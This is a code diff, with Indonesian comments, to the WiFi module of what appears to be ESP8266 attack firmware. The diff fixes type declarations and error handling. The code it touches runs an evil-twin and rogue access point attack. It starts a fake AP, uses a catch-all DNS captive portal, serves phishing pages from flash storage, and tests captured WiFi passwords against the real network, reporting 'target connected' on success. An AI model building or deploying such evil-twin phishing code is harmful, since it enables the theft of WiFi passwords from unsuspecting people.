@@ -23,7 +23,23 @@ extern "C" {
 #include "Scan.h"
 #include "DisplayUI.h"
 
-// --- Deklarasi Variabel Lu ---
+// --- 1. DEFINISI TYPE (Wajib paling atas agar tidak error 'does not name a type') ---
+typedef enum wifi_mode_t {
+    off = 0,
+    ap  = 1,
+    st  = 2
+} wifi_mode_t;
+
+typedef struct ap_settings_t {
+    char    path[33];
+    char    ssid[33];
+    char    password[65];
+    uint8_t channel;
+    bool    hidden;
+    bool    captive_portal;
+} ap_settings_t;
+
+// --- 2. VARIABEL GLOBAL ---
 String MAC_;
 String nama;
 char eviltwinpath[32];
@@ -33,7 +49,7 @@ String tes_password;
 String data_pishing;
 String LOG;
 String json_data;
-String fileList = ""; // Biar gak error 'fileList' not declared
+String fileList = ""; 
 bool hidden_target = false;
 bool rogueap_continues = false;
 
@@ -45,6 +61,7 @@ extern CLI    cli;
 extern Attack attack;
 
 namespace wifi {
+    // --- 3. VARIABEL DALAM NAMESPACE ---
     wifi_mode_t   mode;
     ap_settings_t ap_settings;
     ESP8266WebServer server(80);
@@ -52,30 +69,35 @@ namespace wifi {
     IPAddress ip WEB_IP_ADDR;
     IPAddress netmask(255, 255, 255, 0);
 
-    // --- FUNGSI HANDLER (Ditaruh di atas biar startAP kenal) ---
-
+    // --- 4. FUNGSI HANDLER (Ditaruh sebelum dipanggil di startAP) ---
     void handleFileListJS(){
         server.send(200, "text/plain", fileList);
     }
 
     void send_eviltwin() {
-        // Panggil file eviltwin lu
         File f = LittleFS.open("/eviltwin.html", "r");
-        server.streamFile(f, "text/html");
-        f.close();
+        if(f) {
+            server.streamFile(f, "text/html");
+            f.close();
+        } else {
+            server.send(404, "text/plain", "File Eviltwin Hilang");
+        }
     }
 
     void send_rogueap() {
-        // Panggil file pishing lu
         File f = LittleFS.open("/rogue.html", "r");
-        server.streamFile(f, "text/html");
-        f.close();
+        if(f) {
+            server.streamFile(f, "text/html");
+            f.close();
+        } else {
+            server.send(404, "text/plain", "File Rogue Hilang");
+        }
     }
 
     void handleDelete() {
         String path = server.arg("path");
-        LittleFS.remove(path);
-        server.send(200, "text/plain", "Deleted");
+        if(LittleFS.remove(path)) server.send(200, "text/plain", "Berhasil Dihapus");
+        else server.send(500, "text/plain", "Gagal Hapus");
     }
 
     void sendFSjson() {
@@ -83,17 +105,21 @@ namespace wifi {
     }
 
     void pathsave() {
-        server.send(200, "text/plain", "Saved");
+        server.send(200, "text/plain", "Path Tersimpan");
     }
 
-    // --- FUNGSI UTAMA ---
+    // --- 5. FUNGSI LOGIKA UTAMA ---
+    void begin() {
+        mode = wifi_mode_t::off;
+        WiFi.mode(WIFI_OFF);
+        wifi_set_opmode(STATION_MODE);
+    }
 
     void startAP() {
         WiFi.softAPConfig(ip, ip, netmask);
         WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
         dns.start(53, "*", ip);
         
-        // Sekarang compiler gak bakal bingung lagi nyari fungsi ini
         server.on("/filelist", handleFileListJS);
         server.on("/delete", handleDelete);
         server.on("/filemanager.json", sendFSjson);
@@ -102,8 +128,12 @@ namespace wifi {
         server.on("/", HTTP_GET, []() {
             if(!attack.eviltwin && !attack.pishing){
                 File f = LittleFS.open("/index.html", "r");
-                server.streamFile(f, "text/html");
-                f.close();
+                if(f) {
+                    server.streamFile(f, "text/html");
+                    f.close();
+                } else {
+                    server.send(200, "text/html", "<b>Web Interface Belum Diupload ke LittleFS</b>");
+                }
             } else {
                 if(attack.eviltwin) send_eviltwin();
                 if(attack.pishing) send_rogueap();
@@ -123,14 +153,21 @@ namespace wifi {
 
         server.on("/result", [](){
             if (WiFi.status() != WL_CONNECTED) {
-                // INI PERUBAHAN TEKS INDO NYA
+                // Teks Bahasa Indonesia
                 server.send(200, "text/html", "<script>alert('Gagal! Cek Password lagi');history.back();</script>");
                 tes_password = "";
             } else {
-                server.send(200, "text/html", "<h2>Sukses!</h2>");
+                server.send(200, "text/html", "<h2>Sukses! Target Terhubung.</h2>");
                 ESP.restart();
             }
         });
         server.begin();
+    }
+
+    void update() {
+        if (mode != wifi_mode_t::off) {
+            server.handleClient();
+            dns.processNextRequest();
+        }
     }
 }
